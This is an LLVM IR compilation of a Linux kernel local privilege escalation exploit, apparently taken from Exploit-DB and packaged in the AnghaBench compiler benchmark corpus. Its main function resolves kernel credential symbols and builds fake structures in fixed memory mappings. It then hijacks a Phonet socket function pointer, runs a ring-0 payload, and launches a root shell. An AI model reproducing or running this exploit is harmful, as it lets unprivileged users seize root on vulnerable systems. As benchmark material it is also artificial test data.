; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86/local/extr_15916.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86/local/extr_15916.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [49 x i8] c"[*] Testing Phonet support and CAP_SYS_ADMIN...\0A\00", align 1
@PF_PHONET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EPERM = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [35 x i8] c"[*] You don't have CAP_SYS_ADMIN.\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"[*] Failed to open Phonet socket.\0A\00", align 1
@.str.3 = private unnamed_addr constant [33 x i8] c"[*] Resolving kernel symbols...\0A\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"proto_tab\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"phonet_dgram_ops\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"pn_socket_ioctl\00", align 1
@.str.7 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [39 x i8] c"[*] Failed to resolve kernel symbols.\0A\00", align 1
@.str.10 = private unnamed_addr constant [34 x i8] c"[*] Preparing fake structures...\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str.11 = private unnamed_addr constant [33 x i8] c"[*] Failed to map landing area.\0A\00", align 1
@.str.12 = private unnamed_addr constant [28 x i8] c"[*] Calculating offsets...\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"[*] Test run failed.\0A\00", align 1
@.str.14 = private unnamed_addr constant [35 x i8] c"[*] Modifying function pointer...\0A\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"[*] Failed to map payload area.\0A\00", align 1
@konami = common dso_local global i32 0, align 4
@.str.16 = private unnamed_addr constant [39 x i8] c"[*] Executing Konami code at ring0...\0A\00", align 1
@.str.17 = private unnamed_addr constant [33 x i8] c"[*] Exploit failed to get root.\0A\00", align 1
@.str.18 = private unnamed_addr constant [45 x i8] c"[*] Konami code worked!  Have a root shell.\0A\00", align 1
@.str.19 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64*, align 8
  %16 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %9, align 4
  %17 = call i32 @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str, i64 0, i64 0))
  %18 = load i32, i32* @PF_PHONET, align 4
  %19 = load i32, i32* @SOCK_DGRAM, align 4
  %20 = call i32 @socket(i32 %18, i32 %19, i32 0)
  store i32 %20, i32* %6, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %32

23:                                               ; preds = %2
  %24 = load i64, i64* @errno, align 8
  %25 = load i64, i64* @EPERM, align 8
  %26 = icmp eq i64 %24, %25
  br i1 %26, label %27, label %29

27:                                               ; preds = %23
  %28 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  br label %31

29:                                               ; preds = %23
  %30 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  br label %31

31:                                               ; preds = %29, %27
  store i32 -1, i32* %3, align 4
  br label %250

32:                                               ; preds = %2
  %33 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.3, i64 0, i64 0))
  %34 = call i8* @get_kernel_sym(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %35 = ptrtoint i8* %34 to i64
  store i64 %35, i64* %10, align 8
  %36 = call i8* @get_kernel_sym(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %37 = ptrtoint i8* %36 to i64
  store i64 %37, i64* %13, align 8
  %38 = call i8* @get_kernel_sym(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %39 = ptrtoint i8* %38 to i64
  store i64 %39, i64* %14, align 8
  %40 = call i8* @get_kernel_sym(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.7, i64 0, i64 0))
  store i8* %40, i8** @commit_creds, align 8
  %41 = call i8* @get_kernel_sym(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.8, i64 0, i64 0))
  store i8* %41, i8** @prepare_kernel_cred, align 8
  %42 = load i64, i64* %10, align 8
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %56

44:                                               ; preds = %32
  %45 = load i8*, i8** @commit_creds, align 8
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %56

47:                                               ; preds = %44
  %48 = load i8*, i8** @prepare_kernel_cred, align 8
  %49 = icmp ne i8* %48, null
  br i1 %49, label %50, label %56

50:                                               ; preds = %47
  %51 = load i64, i64* %13, align 8
  %52 = icmp ne i64 %51, 0
  br i1 %52, label %53, label %56

53:                                               ; preds = %50
  %54 = load i64, i64* %14, align 8
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %58, label %56

56:                                               ; preds = %53, %50, %47, %44, %32
  %57 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

58:                                               ; preds = %53
  store i64 536870912, i64* %11, align 8
  %59 = load i64, i64* %11, align 8
  %60 = load i64, i64* %10, align 8
  %61 = sub i64 %59, %60
  %62 = lshr i64 %61, 2
  %63 = or i64 -2147483648, %62
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %7, align 4
  %65 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.10, i64 0, i64 0))
  %66 = load i64, i64* %11, align 8
  %67 = inttoptr i64 %66 to i8*
  %68 = load i32, i32* @PROT_READ, align 4
  %69 = load i32, i32* @PROT_WRITE, align 4
  %70 = or i32 %68, %69
  %71 = load i32, i32* @PROT_EXEC, align 4
  %72 = or i32 %70, %71
  %73 = load i32, i32* @MAP_PRIVATE, align 4
  %74 = load i32, i32* @MAP_ANONYMOUS, align 4
  %75 = or i32 %73, %74
  %76 = load i32, i32* @MAP_FIXED, align 4
  %77 = or i32 %75, %76
  %78 = call i8* @mmap(i8* %67, i32 65536, i32 %72, i32 %77, i32 0, i32 0)
  store i8* %78, i8** %16, align 8
  %79 = load i8*, i8** %16, align 8
  %80 = load i8*, i8** @MAP_FAILED, align 8
  %81 = icmp eq i8* %79, %80
  br i1 %81, label %82, label %84

82:                                               ; preds = %58
  %83 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

84:                                               ; preds = %58
  %85 = load i64, i64* %11, align 8
  %86 = inttoptr i64 %85 to i64*
  store i64* %86, i64** %15, align 8
  %87 = load i64*, i64** %15, align 8
  %88 = getelementptr inbounds i64, i64* %87, i64 1
  %89 = ptrtoint i64* %88 to i64
  %90 = load i64*, i64** %15, align 8
  %91 = getelementptr inbounds i64, i64* %90, i64 0
  store i64 %89, i64* %91, align 8
  store i32 1, i32* %8, align 4
  br label %92

92:                                               ; preds = %103, %84
  %93 = load i32, i32* %8, align 4
  %94 = icmp slt i32 %93, 4
  br i1 %94, label %95, label %106

95:                                               ; preds = %92
  %96 = load i64*, i64** %15, align 8
  %97 = getelementptr inbounds i64, i64* %96, i64 4
  %98 = ptrtoint i64* %97 to i64
  %99 = load i64*, i64** %15, align 8
  %100 = load i32, i32* %8, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i64, i64* %99, i64 %101
  store i64 %98, i64* %102, align 8
  br label %103

103:                                              ; preds = %95
  %104 = load i32, i32* %8, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %8, align 4
  br label %92

106:                                              ; preds = %92
  store i32 4, i32* %8, align 4
  br label %107

107:                                              ; preds = %118, %106
  %108 = load i32, i32* %8, align 4
  %109 = icmp slt i32 %108, 204
  br i1 %109, label %110, label %121

110:                                              ; preds = %107
  %111 = load i64*, i64** %15, align 8
  %112 = getelementptr inbounds i64, i64* %111, i64 204
  %113 = ptrtoint i64* %112 to i64
  %114 = load i64*, i64** %15, align 8
  %115 = load i32, i32* %8, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i64, i64* %114, i64 %116
  store i64 %113, i64* %117, align 8
  br label %118

118:                                              ; preds = %110
  %119 = load i32, i32* %8, align 4
  %120 = add nsw i32 %119, 1
  store i32 %120, i32* %8, align 4
  br label %107

121:                                              ; preds = %107
  store i64 805306368, i64* %12, align 8
  store i32 204, i32* %8, align 4
  br label %122

122:                                              ; preds = %131, %121
  %123 = load i32, i32* %8, align 4
  %124 = icmp slt i32 %123, 404
  br i1 %124, label %125, label %134

125:                                              ; preds = %122
  %126 = load i64, i64* %12, align 8
  %127 = load i64*, i64** %15, align 8
  %128 = load i32, i32* %8, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i64, i64* %127, i64 %129
  store i64 %126, i64* %130, align 8
  br label %131

131:                                              ; preds = %125
  %132 = load i32, i32* %8, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %8, align 4
  br label %122

134:                                              ; preds = %122
  %135 = load i32, i32* @PROT_READ, align 4
  %136 = load i32, i32* @PROT_WRITE, align 4
  %137 = or i32 %135, %136
  %138 = load i32, i32* @PROT_EXEC, align 4
  %139 = or i32 %137, %138
  %140 = load i32, i32* @MAP_PRIVATE, align 4
  %141 = load i32, i32* @MAP_ANONYMOUS, align 4
  %142 = or i32 %140, %141
  %143 = load i32, i32* @MAP_FIXED, align 4
  %144 = or i32 %142, %143
  %145 = call i8* @mmap(i8* inttoptr (i64 805306368 to i8*), i32 33554432, i32 %139, i32 %144, i32 0, i32 0)
  store i8* %145, i8** %16, align 8
  %146 = load i8*, i8** %16, align 8
  %147 = load i8*, i8** @MAP_FAILED, align 8
  %148 = icmp eq i8* %146, %147
  br i1 %148, label %149, label %151

149:                                              ; preds = %134
  %150 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.11, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

151:                                              ; preds = %134
  %152 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0))
  %153 = load i32, i32* @PF_PHONET, align 4
  %154 = load i32, i32* @SOCK_DGRAM, align 4
  %155 = load i32, i32* %7, align 4
  %156 = call i32 @socket(i32 %153, i32 %154, i32 %155)
  store i64* inttoptr (i64 805306368 to i64*), i64** %15, align 8
  store i32 0, i32* %8, align 4
  br label %157

157:                                              ; preds = %173, %151
  %158 = load i32, i32* %8, align 4
  %159 = icmp slt i32 %158, 8388608
  br i1 %159, label %160, label %176

160:                                              ; preds = %157
  %161 = load i64*, i64** %15, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i64, i64* %161, i64 %163
  %165 = load i64, i64* %164, align 8
  %166 = icmp ne i64 %165, 0
  br i1 %166, label %167, label %172

167:                                              ; preds = %160
  %168 = load i32, i32* %8, align 4
  %169 = sext i32 %168 to i64
  %170 = mul i64 %169, 8
  %171 = trunc i64 %170 to i32
  store i32 %171, i32* %9, align 4
  br label %176

172:                                              ; preds = %160
  br label %173

173:                                              ; preds = %172
  %174 = load i32, i32* %8, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %8, align 4
  br label %157

176:                                              ; preds = %167, %157
  %177 = load i32, i32* %9, align 4
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %181

179:                                              ; preds = %176
  %180 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

181:                                              ; preds = %176
  %182 = load i64, i64* %13, align 8
  %183 = add i64 %182, 80
  %184 = sub i64 %183, 1
  %185 = load i32, i32* %9, align 4
  %186 = sext i32 %185 to i64
  %187 = sub i64 %184, %186
  store i64 %187, i64* %12, align 8
  %188 = load i64, i64* %11, align 8
  %189 = inttoptr i64 %188 to i64*
  store i64* %189, i64** %15, align 8
  store i32 204, i32* %8, align 4
  br label %190

190:                                              ; preds = %199, %181
  %191 = load i32, i32* %8, align 4
  %192 = icmp slt i32 %191, 404
  br i1 %192, label %193, label %202

193:                                              ; preds = %190
  %194 = load i64, i64* %12, align 8
  %195 = load i64*, i64** %15, align 8
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds i64, i64* %195, i64 %197
  store i64 %194, i64* %198, align 8
  br label %199

199:                                              ; preds = %193
  %200 = load i32, i32* %8, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %8, align 4
  br label %190

202:                                              ; preds = %190
  %203 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.14, i64 0, i64 0))
  %204 = load i64, i64* %14, align 8
  store i64 %204, i64* %11, align 8
  br label %205

205:                                              ; preds = %209, %202
  %206 = load i64, i64* %11, align 8
  %207 = and i64 %206, 4278190080
  %208 = icmp ne i64 %207, 268435456
  br i1 %208, label %209, label %216

209:                                              ; preds = %205
  %210 = load i32, i32* @PF_PHONET, align 4
  %211 = load i32, i32* @SOCK_DGRAM, align 4
  %212 = load i32, i32* %7, align 4
  %213 = call i32 @socket(i32 %210, i32 %211, i32 %212)
  %214 = load i64, i64* %11, align 8
  %215 = add i64 %214, 16777216
  store i64 %215, i64* %11, align 8
  br label %205

216:                                              ; preds = %205
  %217 = load i64, i64* %11, align 8
  %218 = and i64 %217, -4096
  %219 = inttoptr i64 %218 to i8*
  %220 = load i32, i32* @PROT_READ, align 4
  %221 = load i32, i32* @PROT_WRITE, align 4
  %222 = or i32 %220, %221
  %223 = load i32, i32* @PROT_EXEC, align 4
  %224 = or i32 %222, %223
  %225 = load i32, i32* @MAP_PRIVATE, align 4
  %226 = load i32, i32* @MAP_ANONYMOUS, align 4
  %227 = or i32 %225, %226
  %228 = load i32, i32* @MAP_FIXED, align 4
  %229 = or i32 %227, %228
  %230 = call i8* @mmap(i8* %219, i32 65536, i32 %224, i32 %229, i32 0, i32 0)
  store i8* %230, i8** %16, align 8
  %231 = load i8*, i8** %16, align 8
  %232 = load i8*, i8** @MAP_FAILED, align 8
  %233 = icmp eq i8* %231, %232
  br i1 %233, label %234, label %236

234:                                              ; preds = %216
  %235 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

236:                                              ; preds = %216
  %237 = load i64, i64* %11, align 8
  %238 = inttoptr i64 %237 to i8*
  %239 = call i32 @memcpy(i8* %238, i32* @konami, i32 1024)
  %240 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.16, i64 0, i64 0))
  %241 = load i32, i32* %6, align 4
  %242 = call i32 @ioctl(i32 %241, i32 0, i32* null)
  %243 = call i64 (...) @getuid()
  %244 = icmp ne i64 %243, 0
  br i1 %244, label %245, label %247

245:                                              ; preds = %236
  %246 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %250

247:                                              ; preds = %236
  %248 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.18, i64 0, i64 0))
  %249 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.19, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.19, i64 0, i64 0), i32* null)
  br label %250

250:                                              ; preds = %247, %245, %234, %179, %149, %82, %56, %31
  %251 = load i32, i32* %3, align 4
  ret i32 %251
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i8* @get_kernel_sym(i8*) #1

declare dso_local i8* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @ioctl(i32, i32, i32*) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
